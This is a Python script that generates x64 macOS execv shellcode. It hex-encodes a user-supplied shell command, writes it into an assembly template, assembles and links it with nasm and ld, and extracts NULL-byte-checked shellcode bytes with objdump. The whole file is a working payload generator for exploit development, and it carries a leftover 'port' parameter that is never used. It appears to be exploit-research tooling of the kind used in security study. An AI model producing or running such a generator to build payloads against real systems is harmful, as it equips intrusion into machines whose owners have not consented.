#!/usr/bin/python3

import argparse
import sys
import os
import socket
import textwrap
import subprocess

def set_command(command):
	hex_command = command[::-1].encode("utf-8").hex()
	
	print("[*] Command converted into hex: {}".format(hex_command))
	
	print("[*] Command length: {}".format(len(hex_command)))

	# If the command length is greater than 16, break it down into chunks and add additional '/' to make up the difference	
	command_strings = command.split()
	root_command = command_strings[0]
	
	# Get the root command
	output = subprocess.getoutput("which {}".format(root_command))

	command = " ".join([output] + command_strings[1:])

	l = len(command) % 16
	if l != 0:
		command = (16-l) * '/' + command

	hex_command = command[::-1].encode("utf-8").hex()

	# Calculate how many times the command string is divisible by 16
	i = len(hex_command) / 16
	if i > 1:
		command_bytes = textwrap.wrap(hex_command, 16)
		commands = ["0x" + c for c in command_bytes]
		l = len(commands[-1])
	else:
		commands = ["0x" + hex_command]

	instructions = ""

	for c in commands:
		instructions += "\n\tmov rdx, {}\n\tpush rdx".format(c)

	asm = open("macOS_execv_x64.asm", 'rt')
	data = asm.read()
	data = data.replace('COMMAND', instructions)
	asm.close()
	asm = open('execv.asm', 'wt')
	asm.write(data)
	asm.close()

def gen_shellcode(port):
	stream = os.popen("""objdump -d ./execv |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|tr -d '\n'|sed 's/^/"/'|sed 's/$/"/g'""".format(port))
	shellcode = stream.read().rstrip()
	shellcode = shellcode.replace("x", "\\x")
	return shellcode

def print_shellcode(shellcode, command):
	print("[*] Generating shellcode for x64 macOS execv command '%s'" % command)
	print("[*] Shellcode length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
	print(shellcode)

def main():

	parser = argparse.ArgumentParser(description='Generate x64 macOS execv shellcode.')
	parser.add_argument('-c', '--command', type=str, help='Shell command to generate shellcode')
	
	args = parser.parse_args()
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit()

	# Modify the command in macOS_execv_x64.nasm
	set_command(args.command)
	
	# Link and assemble code
	os.system('nasm -f macho64 -o macOS_execv_x64.o execv.asm')
	os.system('ld -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem macOS_execv_x64.o -o execv')
	
	# Dump the shellcode using objdump
	shellcode = gen_shellcode(args.command)

	# Print shellcode
	print_shellcode(shellcode, args.command)

	# Cleanup
	os.system('rm macOS_execv_x64.o')

if __name__ == "__main__":
	main()
